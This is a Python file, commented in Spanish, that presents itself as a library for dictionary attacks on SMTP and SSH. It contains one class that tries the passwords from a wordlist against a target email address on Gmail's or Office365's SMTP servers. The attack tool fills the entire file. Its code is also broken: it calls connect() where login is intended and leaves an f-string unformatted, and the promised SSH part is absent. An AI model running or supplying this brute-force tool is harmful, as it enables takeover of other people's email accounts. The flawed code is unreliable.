"""
Autor:      ThroughTheFirewall
Fecha:      17/12/2022
Descripción:
    Librería que contiene los scripts que
    permiten realizar ataques de diccionario
    sobre los servicios SMTP y SSH

Redes:
    YouTube:    @throughthefirewall
    Twitter:    @FirewalThrough
    Web:        www.through-the-firewall.com
"""

#Importamos las librerias que usaremos
import smtplib

#Creamos nuestra clase junto con el método inicializador
class Servicio_SMTP():
    def __init__(self, email, diccionario):
        #Creamos las variables que almacenen los parametros recibidos
        self.__email = email
        self.__diccionario = diccionario

        #Creamos el diccionario con los servidores SMTP
        self.__servidores_smtp = {
                "gmail":"smtp.gmail.com",
                "hotmail":"smtp.office365.com"}

    #Creamos el método que verificará el servidor del email
    def verificar_servidor(self):
        #Creamos una lista con el nombre de los servicios smtp
        self.__servicios = ["gmail", "hotmail"]

        #Recorremos la lista
        for servicio in self.__servicios:
            #verificamos el servicio en el email
            if(servicio in self.__email):
                return self.__servidores_smtp[servicio]

    #Creamos el método que realizará el ataque de diccionario
    def ataque_SMTP(self):
        self.__servidor = self.verificar_servidor()
        #Verificamos que el resultado sea distinto a None
        if(self.__servidor == None):
            exit()
        else:
            print(f"[+]Iniciando conexiones a {self.__servidor}")
        try:
            #Abrimos el diccionario
            archivo = open(self.__diccionario, 'r')
            #Recorremos el archivo con el bucle for y
            #almacenamos el resultado en password
            for linea in archivo:
                password = linea[:-1]
                try:
                    #Nos conectamos al servidor
                    self.__cliente = smtplib.SMTP(self.__servidor, 587)
                    #Establecemos una conexión cifrada
                    self.__cliente.starttls()
                    #Nos conectamos con el email y password
                    self.__cliente.connect(self.__email, password)
                    self.__cliente.quit()

                    return password
                    break
                #Continuamos el programa ignorando la excepción de autenticación
                except smtplib.SMTPAuthenticationError:
                    print("Password Incorrecta: {password}")

        #Validamos que el archivo exista con la excepción
        except FileNotFoundError as error:
            print(error)
            exit()

